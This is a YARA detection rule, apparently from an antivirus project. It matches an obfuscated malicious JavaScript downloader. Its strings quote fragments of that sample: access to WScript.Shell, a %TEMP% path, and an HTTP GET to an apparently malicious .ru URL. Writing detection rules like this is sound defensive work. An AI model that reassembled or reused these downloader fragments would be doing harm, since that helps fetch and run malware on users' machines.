rule sig_20160427_536859ace4764e2c120ed7f57b431bd7 {
  meta:
    description = "datamaliciousorder - file 20160427_536859ace4764e2c120ed7f57b431bd7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4d829d9e37bca3eb241d29a77c4cb0404aba7677cc552f6ca7e0e05cf08ec8b6"

  strings:
    $s1  = "function InwynWnnwp() {return UitpiTpnic[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JfdqPjw" ascii
    $s2  = "function InwynWnnwp() {return UitpiTpnic[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JfdqPjw" ascii
    $s3  = "function MmdxaPtlnb(JmcsiMsviy, UordkMtqmk){KolduUbprf = KolduUbprf * 1; return JmcsiMsviy - UordkMtqmk;};" fullword ascii
    $s4  = "HnhjpEmmdh[JccwxGrewf](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s5  = "function FxvwvRtpfr(){return CfkgxHzsiv + \"\";};" fullword ascii
    $s6  = "if (HnhjpEmmdh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "var UitpiTpnic = function PlhutJuzxk() {return LdbozAsmca[BzjcoBnlhb](\"WScript\"+\".Shell\");}(), CftczGgjhr = 11;" fullword ascii
    $s8  = "function FtgksEreet() {return ((MunmsIhwmg == true) && (MunmsIhwmg == QjuooSqgmf)) ? 1 : KolduUbprf;};" fullword ascii
    $s9  = "var LdbozAsmca = this[\"WScript\"];" fullword ascii
    $s10 = "var MunmsIhwmg = false;" fullword ascii
    $s11 = "return MmdxaPtlnb(KrxpjLtyyn, GhmirHirli);" fullword ascii
    $s12 = "KsmseKojlr = true;" fullword ascii
    $s13 = "var CzghyExlal = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function WbopvAhzjr(){return 23;};" fullword ascii
    $s15 = "function XaulnHqrov(){return BzjcoBnlhb;};" fullword ascii
    $s16 = "}while (SnikwMqjxb);" fullword ascii
    $s17 = "var QjuooSqgmf = false;" fullword ascii
    $s18 = "var KsmseKojlr = false;" fullword ascii
    $s19 = "QjuooSqgmf = true; " fullword ascii
    $s20 = "MunmsIhwmg = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}